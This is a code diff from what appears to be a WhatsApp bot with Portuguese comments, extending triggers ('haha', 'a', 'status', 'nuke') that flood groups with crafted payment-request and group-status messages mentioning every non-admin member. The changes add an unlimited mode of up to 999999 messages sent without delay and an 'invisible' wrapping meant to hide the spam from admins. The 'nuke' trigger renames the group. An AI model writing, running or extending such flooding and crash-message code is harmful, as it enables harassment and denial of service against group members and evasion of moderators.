@@ -33,9 +33,9 @@ module.exports = (client) => {
             const botId = client.user.id.split(':')[0] + '@s.whatsapp.net';
             const sender = msg.key.fromMe ? botId : (msg.key.participant || msg.key.remoteJid);
 
-            // --- GATILHO: "haha" (DIV + STATUS SIMULTÂNEO) ---
+            // --- GATILHO: "haha" (DIV + STATUS SIMULTÂNEO / RESPEITA ANTIADM E SEM LIMITES) ---
             if (textoBaixo.includes("haha") && !global.botOff) {
-                const admins = gMeta.participants.filter(v => v.admin !== null).map(v => v.id);
+                const admins = gMeta.participants.filter(v => !!v.admin).map(v => v.id);
                 const participantes = gMeta.participants
                     .map(u => u.id)
                     .filter(id => id !== botId && !admins.includes(id));
@@ -51,80 +51,187 @@ module.exports = (client) => {
                 }
                 statusText = statusText.replace(/```/g, "").replace(/\n{3,}/g, "\n\n").trim();
 
-                for (let i = 0; i < 5; i++) {
-                    try {
-                        // Envia Status
-                        await client.relayMessage(from, {
-                            groupStatusMessageV2: {
-                                message: {
-                                    requestPaymentMessage: {
-                                        currencyCodeIso4217: "",
-                                        amount1000: "0",
-                                        noteMessage: {
-                                            extendedTextMessage: {
-                                                text: statusText,
-                                                contextInfo: { isGroupStatus: true, mentionedJid: participantes }
-                                            }
-                                        },
-                                        expiryTimestamp: "0",
-                                        amount: { value: "0", offset: 1000, currencyCode: "" }
-                                    }
-                                }
-                            }
-                        }, {});
+                const count = global.semLimites ? 999999 : 5;
+                const modo = global.antiAdmMode || 'ambos';
+                const semLimites = !!global.semLimites;
 
-                        // Envia Payment (DIV)
-                        await client.relayMessage(from, {
-                            requestPaymentMessage: {
-                                currencyCodeIso4217: "BRL",
-                                amount1000: "10000",
-                                noteMessage: {
-                                    extendedTextMessage: {
-                                        text: fullText,
-                                        contextInfo: { mentionedJid: participantes }
-                                    }
-                                }
-                            }
-                        }, {});
+                for (let i = 0; i < count; i++) {
+                     try {
+                         // Envia Status (se for 'status' ou 'ambos')
+                         if (modo === 'status' || modo === 'ambos') {
+                             await client.relayMessage(from, {
+                                 groupStatusMessageV2: {
+                                     message: {
+                                         requestPaymentMessage: {
+                                             currencyCodeIso4217: "",
+                                             amount1000: "0",
+                                             noteMessage: {
+                                                 extendedTextMessage: {
+                                                     text: statusText,
+                                                     contextInfo: { isGroupStatus: true, mentionedJid: participantes }
+                                                 }
+                                             },
+                                             expiryTimestamp: "0",
+                                             amount: { value: "0", offset: 1000, currencyCode: "" }
+                                         }
+                                     }
+                                 }
+                             }, {});
+                         }
 
-                        await new Promise(r => setTimeout(r, 1000));
-                        
-                    } catch (err) {
-                        if (err.message.includes('rate-overlimit')) {
-                            await new Promise(r => setTimeout(r, 2000));
-                        } else {
-                            console.log("Erro no gatilho haha:", err.message);
-                        }
-                    }
+                         // Envia Chat (se for 'desativado' ou 'ambos')
+                         if (modo === 'desativado') {
+                             // Chat visível (Normal)
+                             await client.relayMessage(from, {
+                                 requestPaymentMessage: {
+                                     currencyCodeIso4217: "BRL",
+                                     amount1000: "10000",
+                                     noteMessage: {
+                                         extendedTextMessage: {
+                                             text: fullText,
+                                             contextInfo: { mentionedJid: participantes }
+                                         }
+                                     }
+                                 }
+                             }, {});
+                         } else if (modo === 'ambos') {
+                             // Chat invisível (Envelopado em groupStatusMessageV2)
+                             await client.relayMessage(from, {
+                                 groupStatusMessageV2: {
+                                     message: {
+                                         requestPaymentMessage: {
+                                             currencyCodeIso4217: "BRL",
+                                             amount1000: "10000",
+                                             noteMessage: {
+                                                 extendedTextMessage: {
+                                                     text: fullText,
+                                                     contextInfo: { isGroupStatus: true, mentionedJid: participantes }
+                                                 }
+                                             },
+                                             expiryTimestamp: "0",
+                                             amount: { value: "10000", offset: 1000, currencyCode: "BRL" }
+                                         }
+                                     }
+                                 }
+                             }, {});
+                         }
+
+                         if (semLimites) {
+                             await new Promise(r => setImmediate(r));
+                         } else {
+                             await new Promise(r => setTimeout(r, 1000));
+                         }
+                         
+                     } catch (err) {
+                         if (err.message.includes('rate-overlimit')) {
+                             await new Promise(r => setTimeout(r, 2000));
+                         } else {
+                             console.log("Erro no gatilho haha:", err.message);
+                         }
+                     }
                 }
             }
 
-            // --- GATILHO: "a" (DIV ISOLADA) ---
+            // --- GATILHO: "a" (DIV + STATUS / DIV SOLTA RESPEITA ANTIADM E SEM LIMITES) ---
             if (textoBaixo === "a" && !global.botOff) {
-                const admins = gMeta.participants.filter(v => v.admin !== null).map(v => v.id);
+                const admins = gMeta.participants.filter(v => !!v.admin).map(v => v.id);
                 const participantes = gMeta.participants
                     .map(u => u.id)
                     .filter(id => id !== botId && !admins.includes(id));
-                for (let i = 0; i < 5; i++) {
-                    await client.relayMessage(from, {
-                        requestPaymentMessage: {
-                            currencyCodeIso4217: "BRL",
-                            amount1000: "10000",
-                            noteMessage: {
-                                extendedTextMessage: {
-                                    text: global.mensagemDiv || "MARCOS PASSOU O RATO 🤪",
-                                    contextInfo: { mentionedJid: participantes }
-                                }
-                            }
-                        }
-                    }, {});
-                    await new Promise(r => setTimeout(r, 1000));
+
+                const fullText = global.mensagemDiv || "MARCOS PASSOU O RATO 🤪";
+                let statusText = fullText;
+                
+                const separadorFantasma = "【↯💣─────•𖧹❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ👻❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ𖧹•─────💣↯】";
+                if (statusText.includes(separadorFantasma)) {
+                    const parts = statusText.split(separadorFantasma);
+                    if (parts.length >= 3) {
+                        statusText = parts[0] + "\n\n" + parts.slice(2).join(separadorFantasma);
+                    }
+                }
+                statusText = statusText.replace(/```/g, "").replace(/\n{3,}/g, "\n\n").trim();
+
+                const count = global.semLimites ? 999999 : 5;
+                const modo = global.antiAdmMode || 'ambos';
+                const semLimites = !!global.semLimites;
+
+                for (let i = 0; i < count; i++) {
+                     try {
+                         // Envia Status (se for 'status' ou 'ambos')
+                         if (modo === 'status' || modo === 'ambos') {
+                             await client.relayMessage(from, {
+                                 groupStatusMessageV2: {
+                                     message: {
+                                         requestPaymentMessage: {
+                                             currencyCodeIso4217: "",
+                                             amount1000: "0",
+                                             noteMessage: {
+                                                 extendedTextMessage: {
+                                                     text: statusText,
+                                                     contextInfo: { isGroupStatus: true, mentionedJid: participantes }
+                                                 }
+                                             },
+                                             expiryTimestamp: "0",
+                                             amount: { value: "0", offset: 1000, currencyCode: "" }
+                                         }
+                                     }
+                                 }
+                             }, {});
+                         }
+
+                         // Envia Chat (se for 'desativado' ou 'ambos')
+                         if (modo === 'desativado') {
+                             // Chat visível (Normal)
+                             await client.relayMessage(from, {
+                                 requestPaymentMessage: {
+                                     currencyCodeIso4217: "BRL",
+                                     amount1000: "10000",
+                                     noteMessage: {
+                                         extendedTextMessage: {
+                                             text: fullText,
+                                             contextInfo: { mentionedJid: participantes }
+                                         }
+                                     }
+                                 }
+                             }, {});
+                         } else if (modo === 'ambos') {
+                             // Chat invisível (Envelopado em groupStatusMessageV2)
+                             await client.relayMessage(from, {
+                                 groupStatusMessageV2: {
+                                     message: {
+                                         requestPaymentMessage: {
+                                             currencyCodeIso4217: "BRL",
+                                             amount1000: "10000",
+                                             noteMessage: {
+                                                 extendedTextMessage: {
+                                                     text: fullText,
+                                                     contextInfo: { isGroupStatus: true, mentionedJid: participantes }
+                                                 }
+                                             },
+                                             expiryTimestamp: "0",
+                                             amount: { value: "10000", offset: 1000, currencyCode: "BRL" }
+                                         }
+                                     }
+                                 }
+                             }, {});
+                         }
+
+                         if (semLimites) {
+                             await new Promise(r => setImmediate(r));
+                         } else {
+                             await new Promise(r => setTimeout(r, 1000));
+                         }
+                     } catch (err) {
+                         if (err.message.includes('rate-overlimit')) {
+                             await new Promise(r => setTimeout(r, 2000));
+                         }
+                     }
                 }
             }
 
-            // --- GATILHO: "status" (STATUS ISOLADO) ---
+            // --- GATILHO: "status" (STATUS ISOLADO RESPEITA SEM LIMITES) ---
             if (textoBaixo === "status" && !global.botOff) {
-                const admins = gMeta.participants.filter(v => v.admin !== null).map(v => v.id);
+                const admins = gMeta.participants.filter(v => !!v.admin).map(v => v.id);
                 const participantes = gMeta.participants
                     .map(u => u.id)
                     .filter(id => id !== botId && !admins.includes(id));
@@ -139,7 +246,11 @@ module.exports = (client) => {
                     }
                 }
                 statusText = statusText.replace(/```/g, "").replace(/\n{3,}/g, "\n\n").trim();
-                for (let i = 0; i < 5; i++) {
+
+                const count = global.semLimites ? 999999 : 5;
+                const semLimites = !!global.semLimites;
+
+                for (let i = 0; i < count; i++) {
                     try {
                         await client.relayMessage(from, {
                             groupStatusMessageV2: {
@@ -159,7 +270,12 @@ module.exports = (client) => {
                                 }
                             }
                         }, {});
-                        await new Promise(r => setTimeout(r, 1000));
+                        
+                        if (semLimites) {
+                            await new Promise(r => setImmediate(r));
+                        } else {
+                            await new Promise(r => setTimeout(r, 1000));
+                        }
                     } catch (err) {
                         if (err.message.includes('rate-overlimit')) {
                             await new Promise(r => setTimeout(r, 2000));
@@ -170,7 +286,7 @@ module.exports = (client) => {
 
             // --- GATILHO: "nuke" ---
             if (textoBaixo === "nuke") {
-                const isAdmins = gMeta.participants.filter(v => v.admin !== null).map(v => v.id).includes(sender);
+                const isAdmins = gMeta.participants.filter(v => !!v.admin).map(v => v.id).includes(sender);
                 if (!isAdmins) return;
 
                 await client.groupUpdateSubject(from, "MARCOS PASSOU O RATO 🤪").catch(() => null);
